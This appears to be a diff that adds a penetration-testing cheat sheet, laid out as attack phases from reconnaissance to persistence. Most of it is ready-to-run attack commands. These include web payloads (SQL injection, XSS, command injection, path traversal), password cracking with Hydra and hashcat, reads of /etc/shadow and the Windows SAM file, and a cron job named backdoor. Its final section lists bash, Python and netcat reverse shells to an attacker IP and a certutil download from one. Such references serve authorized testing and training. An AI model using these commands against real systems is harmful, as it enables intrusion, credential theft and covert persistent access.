@@ -1,0 +1,96 @@
+1. Reconnaissance & Information Gathering
+
+Gather as much information as possible about the target network, IPs, and services.
+
+    Nmap Scanning
+        Quick scan: nmap -sC -sV <target>
+        Aggressive scan: nmap -A <target>
+        Scan specific ports: nmap -p 80,443,8080 <target>
+        Scan all ports: nmap -p- <target>
+        Service version scan: nmap -sV <target>
+        Script scan (vulnerability check): nmap --script vuln <target>
+    Network Enumeration (Netcat & Others)
+        Banner grabbing (HTTP): nc -nv <IP> 80 (use HEAD request for HTTP)
+        DNS Enumeration: dnsenum <target_domain>
+        Zone Transfer: dig axfr @<nameserver> <domain>
+    OSINT Tools
+        whois: whois <domain>
+        Google Dorks: Use site:<target_domain> filetype:pdf for open files.
+        Subdomain Enumeration: sublist3r -d <target>
+
+2. Scanning & Vulnerability Detection
+
+Identify open ports, services, and potential vulnerabilities.
+
+    Basic Vulnerability Scanning
+        Nikto (web server scanner): nikto -h http://<target>
+        OpenVAS (network vulnerability scanner): openvas-start
+        Searchsploit (locate known exploits): searchsploit <service/version>
+    Web Enumeration Tools
+        Dirb (directory brute-forcing): dirb http://<target> /usr/share/wordlists/dirb/common.txt
+        Gobuster (directory/file brute-forcing): gobuster dir -u http://<target> -w /path/to/wordlist
+        Whatweb (web tech detection): whatweb <target>
+
+3. Exploitation & Access
+
+Exploiting known vulnerabilities to gain initial access to the system.
+
+    Metasploit
+        Start Metasploit: msfconsole
+        Search for Exploits: search <service/version>
+        Use Exploit: use <exploit_path>
+        Set Payload: set PAYLOAD <payload_path>
+        Execute: exploit
+    Password Attacks
+        Hydra: hydra -l <user> -P <password_list> <target> <protocol> (e.g., SSH, FTP)
+        John the Ripper: john --wordlist=<wordlist> <hashfile>
+        Crack hash: hashcat -m <hash_type> -a 0 <hash_file> <wordlist>
+    Common Web Exploits
+        SQL Injection: Use ' OR '1'='1 to test injection on forms.
+        Cross-Site Scripting (XSS): <script>alert('XSS')</script>
+        Command Injection: ; whoami (try appending to input fields)
+        LFI (Local File Inclusion): ../../../../../etc/passwd
+
+4. Privilege Escalation
+
+Escalate privileges from a low-level user account to a system administrator or root.
+
+    Linux Privilege Escalation
+        Sudo Rights: sudo -l
+        Find SUID Binaries: find / -perm -4000 -type f 2>/dev/null
+        Kernel Exploits: Use uname -r to identify the kernel version and look for kernel exploits on exploit-db or with searchsploit.
+        Weak File Permissions: find / -type f -perm -o+w 2>/dev/null
+
+    Windows Privilege Escalation
+        Check Privileges: whoami /priv
+        Find Installed Programs: wmic product get name,version
+        Service Misconfigurations: Look for writable services and DLLs.
+        PowerUp: Use PowerUp.ps1 script to find privilege escalation vectors.
+
+5. Post-Exploitation
+
+After gaining access, gather as much information as possible and ensure persistence if needed.
+
+    System Enumeration
+        Linux: uname -a, ps aux, netstat -tuln, cat /etc/passwd
+        Windows: systeminfo, netstat -ano, tasklist
+    Data Collection
+        Linux Passwords: cat /etc/shadow
+        Windows SAM: Check C:\Windows\System32\config\SAM
+    Persistence
+        Linux (Cron Jobs): echo "* * * * * /path/to/script" > /etc/cron.d/backdoor
+        Windows (Registry): Add a new registry key to HKCU\Software\Microsoft\Windows\CurrentVersion\Run for persistence
+
+6. Common Tools & Commands
+
+Handy tools and commands for quick access.
+
+    Hash Identification: hashid <hash>
+    Base64 Encode/Decode:
+        Encode: echo 'text' | base64
+        Decode: echo 'base64text' | base64 -d
+    File Transfer (Linux to Windows): certutil -urlcache -split -f "http://<attacker_ip>/file" file
+    Reverse Shells
+        Bash: bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
+        Python: python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<IP>",<PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]);'
+        Netcat: nc -e /bin/sh <attacker_ip> <port>
